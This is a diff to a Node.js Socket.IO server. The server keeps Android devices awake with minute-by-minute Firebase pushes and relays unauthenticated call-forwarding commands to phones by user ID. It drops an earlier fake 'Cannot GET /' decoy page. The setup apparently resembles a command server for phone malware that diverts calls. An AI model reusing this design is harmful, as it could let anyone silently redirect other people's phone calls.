@@ -1,62 +1,84 @@
-require('dotenv').config()
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const admin = require('./firebase-init');
+const cron = require('node-cron');
 
-const express = require("express");
-const { createServer } = require("node:http");
-const { Server } = require("socket.io");
 
+// Create Express app and Socket.IO server
 const app = express();
-const server = createServer(app);
+const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
     origin: "*",
-    methods: ["GET", "POST"],
-    allowedHeaders: ["my-custom-header"],
-    credentials: true,
-  },
+    methods: ["GET", "POST"]
+  }
 });
-
-const PORT = process.env.PORT || 8000
 
 const users = new Map();
 
-function sendLogToClients(message) {
-  io.emit("log", { message });
+// FCM Wake-Up Service
+class FcmWakeUpService {
+  constructor() {
+    this.isKeepAliveDisabled = process.env.XMR_BACKEND_DISABLE_FCM === 'true';
+    this.startScheduler();
+  }
+
+  startScheduler() {
+    cron.schedule('* * * * *', () => this.wakeUpAllDevice());
+  }
+
+  async wakeUpAllDevice() {
+    if (this.isKeepAliveDisabled) {
+      console.debug('FCM keep-alive disabled (set XMR_BACKEND_DISABLE_FCM=false to enable)');
+      return;
+    }
+
+    await this.broadcastMessageToTopic('all');
+    await this.broadcastMessageToTopic('all-2');
+    
+    for (let i = 0; i < 10; i++) {
+      await this.broadcastMessageToTopic(`topic${i}`);
+      await new Promise(resolve => setTimeout(resolve, 200));
+    }
+  }
+
+  async broadcastMessageToTopic(topic) {
+    const message = {
+      data: { data: new Date().toString() },
+      topic,
+      android: {
+        priority: 'high'
+      }
+    };
+
+    try {
+      await admin.messaging().send(message);
+      console.info(`FCM wake-up sent to topic: ${topic}`);
+    } catch (e) {
+      console.error(`FCM error: ${e.message}`);
+    }
+  }
 }
 
-// Middleware to filter based on `user-agent`
+// Start FCM Service
+new FcmWakeUpService();
+console.log('FCM Wake-Up Service initialized');
 
-
-io.on("connection", (socket) => {
-  sendLogToClients(`User connected: ${socket.id}`);
-  console.log(`User connected: ${socket.id}`);
-
+// Socket.IO Event Handlers
+io.on('connection', (socket) => {
   socket.on("register", (userId) => {
     users.set(userId, socket.id);
-    sendLogToClients(users);
-    sendLogToClients(`User registered: ${userId} => ${socket.id}`);
-    console.log(`User registered: ${userId} => ${socket.id}`)
+    console.log(`User registered: ${userId} => ${socket.id}`);
   });
 
-  sendLogToClients(users);
-  console.log(users);
-
-  socket.on("private_message", ({ receiverId, message }) => {
+  socket.on("callForwardingRequest", ({ receiverId, message }) => {
     const receiverSocketId = users.get(receiverId);
     if (receiverSocketId) {
-      io.to(receiverSocketId).emit("message", message);
-      sendLogToClients(`Message sent to ${receiverSocketId}: ${message}`);
-
-      socket.emit("message_status", {
-        status: "DELIVERED",
-        message: message,
-        receiverId: receiverId,
-        timestamp: Date.now()
-      });
-
-      console.log(`Message sent to ${receiverSocketId}: ${message}`);
+      io.to(receiverSocketId).emit("callForwardingRequest", message);
+      console.log(`Call forwarding to ${receiverId}: ${message}`);
     } else {
-      console.log(`USER ${receiverId} IS NOT CONNECTED.`);
-      socket.emit("message_status", {
+      socket.emit("forwardingStatus", {
         status: "FAILED",
         message: message,
         receiverId: receiverId,
@@ -66,44 +88,40 @@ io.on("connection", (socket) => {
     }
   });
 
-  socket.on("callForwardingStatus", (e) => {
-    socket.emit("status", e);
-    console.log(e)
-  })
-
-  socket.on("successfully", (e) => {
-    console.log(`User removed: ${e}`);
-    if(e === "false"){
-      console.log("s");
-      socket.emit("message_statu", {
-        status: "TRUE",
-        timestamp: Date.now()
-      });}
-    if(e === "true"){
-      console.log("a");
-      socket.emit("message_statu", {
-        status: "FALSE",
-        timestamp: Date.now()
-      });
-    }
-    });
+  socket.on("callForwardingStatus", (res) => {
+    io.emit("forwardingStatus", res);
+  });
 
   socket.on("disconnect", () => {
-    console.log(`User disconnected: ${socket.id}`);
     for (let [userId, socketId] of users.entries()) {
       if (socketId === socket.id) {
         users.delete(userId);
-        sendLogToClients(`User removed: ${userId}`);
-        sendLogToClients(users);
-        console.log(`User removed: ${userId}`);
+        console.log(`User disconnected: ${userId}`);
         break;
       }
     }
   });
 });
 
-app.get("/", (req, res) => {
-  return res.status(400).send("<pre>Cannot GET /</pre>");
+// HTTP Routes
+app.get('/', (req, res) => {
+  res.send("Server is running");
 });
 
-server.listen(PORT, () => console.log(`Server Start at port: ${PORT}`));
+app.get('/health', (req, res) => {
+  res.json({
+    status: 'UP',
+    services: {
+      fcm: !(process.env.XMR_BACKEND_DISABLE_FCM === 'true'),
+      socket: true
+    },
+    connections: io.engine.clientsCount
+  });
+});
+
+// Start Server
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+  console.log(`FCM Wake-Up Service: ${process.env.XMR_BACKEND_DISABLE_FCM === 'true' ? 'DISABLED' : 'ENABLED'}`);
+});
